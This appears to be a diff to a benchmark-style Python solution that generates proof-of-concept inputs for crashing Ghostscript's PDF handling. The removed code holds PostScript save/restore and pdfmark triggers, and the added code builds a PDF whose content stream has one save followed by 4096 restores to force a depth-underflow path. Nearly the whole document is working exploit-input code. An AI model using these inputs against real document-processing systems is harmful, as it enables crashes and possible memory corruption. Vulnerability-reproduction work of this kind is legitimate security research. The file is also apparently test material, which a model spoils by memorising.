@@ -1,79 +1,80 @@
+import io
 import os
+import re
 import tarfile
-from typing import Iterable, Optional
-
-
-def _stream_contains(fileobj, needles: Iterable[bytes], chunk_size: int = 1 << 16) -> bool:
-    needles = [n for n in needles if n]
-    if not needles:
-        return False
-    max_len = max(len(n) for n in needles)
-    tail = b""
-    while True:
-        chunk = fileobj.read(chunk_size)
-        if not chunk:
-            return False
-        data = tail + chunk
-        for n in needles:
-            if n in data:
-                return True
-        if max_len > 1:
-            tail = data[-(max_len - 1):]
-        else:
-            tail = b""
-
-
-def _tarball_has_any(src_path: str, needles: Iterable[bytes]) -> bool:
-    if not src_path or not os.path.exists(src_path):
-        return False
-    try:
-        with tarfile.open(src_path, "r:*") as tf:
-            for m in tf:
-                if not m or not m.isfile():
-                    continue
-                name = (m.name or "").lower()
-                if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx")):
-                    continue
-                if "pdf" not in name and "gdev" not in name and "device" not in name:
-                    continue
-                f = tf.extractfile(m)
-                if f is None:
-                    continue
-                with f:
-                    if _stream_contains(f, needles):
-                        return True
-    except Exception:
-        return False
-    return False
-
-
-def _poc_docview() -> bytes:
-    return (
-        b"%!PS\n"
-        b"/s0 save def\n"
-        b"[ /PageMode /UseOutlines /DOCVIEW pdfmark\n"
-        b"s0 restore\n"
-        b"newpath 0 0 moveto 1 1 lineto stroke\n"
-        b"showpage\n"
-        b"%%EOF\n"
-    )
-
-
-def _poc_setpagedevice() -> bytes:
-    return (
-        b"%!PS\n"
-        b"/s0 save def\n"
-        b"<< /PageSize [612 792] >> setpagedevice\n"
-        b"s0 restore\n"
-        b"newpath 0 0 moveto 1 1 lineto stroke\n"
-        b"showpage\n"
-        b"%%EOF\n"
-    )
+from typing import Dict, List, Optional
 
 
 class Solution:
+    def _build_pdf(self, stream_data: bytes) -> bytes:
+        objs: Dict[int, bytes] = {}
+
+        objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
+        objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
+        objs[3] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << >> >>"
+        objs[4] = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(stream_data), stream_data)
+
+        out = bytearray()
+        out += b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"
+
+        offsets: Dict[int, int] = {}
+        for i in sorted(objs.keys()):
+            offsets[i] = len(out)
+            out += (f"{i} 0 obj\n").encode("ascii")
+            out += objs[i]
+            out += b"\nendobj\n"
+
+        xref_off = len(out)
+        max_obj = max(objs.keys())
+        out += (f"xref\n0 {max_obj + 1}\n").encode("ascii")
+        out += b"0000000000 65535 f \n"
+        for i in range(1, max_obj + 1):
+            off = offsets.get(i, 0)
+            out += (f"{off:010d} 00000 n \n").encode("ascii")
+
+        out += b"trailer\n"
+        out += (f"<< /Size {max_obj + 1} /Root 1 0 R >>\n").encode("ascii")
+        out += b"startxref\n"
+        out += (f"{xref_off}\n").encode("ascii")
+        out += b"%%EOF\n"
+        return bytes(out)
+
+    def _detect_gs_fuzzer_mode(self, src_path: str) -> str:
+        # Best-effort: detect whether harness uses gsapi_run_file vs gsapi_run_string
+        # Returns: "file", "string", or "unknown"
+        try:
+            with tarfile.open(src_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isfile():
+                        continue
+                    name = m.name.lower()
+                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx")):
+                        continue
+                    if m.size <= 0:
+                        continue
+                    if m.size > 8_000_000:
+                        continue
+                    f = tf.extractfile(m)
+                    if not f:
+                        continue
+                    data = f.read()
+                    if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
+                        continue
+                    if b"gsapi_run_file" in data or b"gsapi_run_file2" in data or b"run_file" in data:
+                        return "file"
+                    if b"gsapi_run_string" in data or b"gsapi_run_string_with_length" in data:
+                        return "string"
+        except Exception:
+            pass
+        return "unknown"
+
     def solve(self, src_path: str) -> bytes:
-        # Heuristic: if DOCVIEW pdfmark support is present, use the DOCVIEW-based trigger.
-        if _tarball_has_any(src_path, [b"DOCVIEW", b"docview", b"restore_viewer", b"viewer_state_depth", b"viewer depth"]):
-            return _poc_docview()
-        return _poc_setpagedevice()
+        _mode = self._detect_gs_fuzzer_mode(src_path)
+
+        # Crafted PDF content stream: one save, then many restores to force depth underflow paths.
+        # Keep size modest but include enough repetitions to increase likelihood across variants.
+        repeats = 4096
+        stream = b"q\n" + (b"Q\n" * repeats)
+
+        # Always return a valid PDF. Most pdfwrite fuzz harnesses run as a file and auto-detect PDF.
+        return self._build_pdf(stream)
